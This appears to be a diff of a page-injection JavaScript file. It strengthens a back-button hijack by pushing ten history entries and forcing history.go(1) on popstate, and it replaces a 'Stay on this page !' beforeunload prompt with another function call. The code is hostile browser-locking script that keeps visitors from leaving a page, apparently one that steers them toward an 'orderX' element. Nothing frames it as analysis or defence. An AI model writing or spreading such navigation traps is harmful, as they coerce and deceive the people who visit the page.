@@ -1,4 +1,3 @@
-
 var styles1 = `
 
 *, *::after, *::before {
@@ -1047,12 +1046,9 @@ var scriptZT = document.createElement("script");
 scriptZT.type="text/javascript";
 scriptZT.innerHTML=`
 
-history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
-history.pushState(null, null, document.URL);
-document.querySelector('#startAN').click();
-setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
-one();
-});
+! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
+history.go(1);
+}); } } catch (o) {} }();
 
 `;
 document.getElementsByTagName('body')[0].prepend(scriptZT);
@@ -1099,17 +1095,7 @@ addEventListener('touchstart', function(e) {
 var myCN = e.target.className;
 if(myCN!='orderX'){
 
-var scriptZS = document.createElement("script");
-scriptZS.type="text/javascript";
-scriptZS.innerHTML="function addOB(en) { en.returnValue = 'Stay on this page !'; }; window.addEventListener('beforeunload', addOB);";
-document.getElementsByTagName('body')[0].appendChild(scriptZS);
-
-var scriptZN = document.createElement("script");
-scriptZN.type="text/javascript";
-scriptZN.innerHTML="function one() { window.removeEventListener('beforeunload', addOB); }";
-document.getElementsByTagName('body')[0].appendChild(scriptZN);
-
-sessionStorage.setItem("reload", 100);
+myFuncQ();
 
 } else {
 
